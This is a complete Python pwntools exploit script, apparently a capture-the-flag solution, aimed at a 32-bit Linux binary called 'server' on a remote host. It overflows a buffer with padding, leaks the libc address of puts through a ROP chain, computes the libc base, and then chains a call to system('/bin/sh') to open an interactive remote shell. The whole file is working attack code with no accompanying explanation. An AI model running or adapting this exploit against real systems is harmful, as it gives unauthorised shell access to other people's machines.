from pwn import *
elf=ELF("./server")
context.os='linux'
context.log_level='debug'
context.arch="i386"
#p=elf.process()
libc=ELF("./libc6_2.27-3ubuntu1_i386.so")
p=remote("host",port)
padding=b'A'*60

rop=ROP(elf)
rop.call(elf.symbols["puts"],[elf.got["puts"]])
rop.call(elf.symbols["vuln"])
stage1=padding+rop.chain()

p.recvuntil(b"Input some text: ")
p.sendline(stage1)
p.recvuntil(b'Return address: ')
p.recvline()
p.recvline()
s=p.recvline()

leaked_puts = s[:4].strip().ljust(4,b'\x00')
log.success ("Leaked puts@GLIBC: " + str(leaked_puts))
leaked_puts=u32(leaked_puts)
log.success("puts here"+hex(leaked_puts))

libc.address = leaked_puts - libc.symbols['puts']
rop2 = ROP(libc)
rop2.system(next(libc.search(b'/bin/sh\x00')), 0, 0)
payload=padding+rop2.chain()

p.recvuntil(b"Input some text: ")
p.sendline(payload) 
p.interactive()
